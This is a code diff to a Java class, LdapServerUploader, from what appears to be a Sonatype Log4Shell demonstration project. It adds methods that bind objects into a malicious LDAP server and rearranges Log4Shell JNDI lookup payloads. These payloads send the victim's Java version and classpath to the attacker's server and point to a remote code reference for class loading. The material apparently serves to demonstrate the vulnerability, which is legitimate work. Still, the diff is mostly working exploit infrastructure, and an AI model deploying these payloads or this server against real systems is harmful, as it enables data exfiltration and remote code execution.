@@ -1,8 +1,4 @@
-package com.sonatype.demo.log4shell;
-
-
-
-import com.sonatype.demo.log4shelldemo.helpers.DockerEnvironment;
+package com.sonatype.demo.log4shelldemo.helpers;
 
 import javax.naming.Context;
 import javax.naming.InitialContext;
@@ -39,6 +35,25 @@ public class LdapServerUploader {
 
     }
 
+    public static void upload(String key, Object o) {
+        LdapServerUploader l= null;
+        try {
+            l = new LdapServerUploader();
+            l.install(key,o);
+        } catch (NamingException e) {
+            e.printStackTrace();
+        }
+
+    }
+
+    private void install(String key, Object o) {
+        try {
+            ctx.bind(key,o);
+        } catch (NamingException e) {
+            e.printStackTrace();
+        }
+    }
+
 
     public void addObjects() throws NamingException {
 
@@ -54,13 +69,14 @@ public class LdapServerUploader {
             m.put("gadget-chain",list);
             ctx.bind("cn=gadget", m);
 
+            ctx.bind("cn=version","${jndi:"+ldapserver+"/echo/${sys:java.version}}");
 
 
             ctx.bind("cn=thankyou","thanks for your data");
         ctx.bind("cn=template","${jndi:"+ldapserver+"/server-data/${sys:java.class.path}//${sys:java.version}//ID1}");
-        ctx.bind("cn=version","${jndi:"+ldapserver+"/version/${sys:java.version}//ID1}");
-        ctx.bind("cn=classpath","${jndi:"+ldapserver+"/classpath/${sys:java.class.path}/}");
-        ctx.bind("cn=thankyou","thank you for your data");
+        ctx.bind("cn=getversion","${jndi:"+ldapserver+"/version/${sys:java.version}//ID1}");
+        ctx.bind("cn=getclasspath","${jndi:"+ldapserver+"/classpath/${sys:java.class.path}/}");
+        ctx.bind("cn=saythankyou","thank you for your data");
         ctx.bind("cn=404","nope - no idea");
 
         Reference ref = new Reference("ExternalObject","ExternalObject",refserver+"/code/");
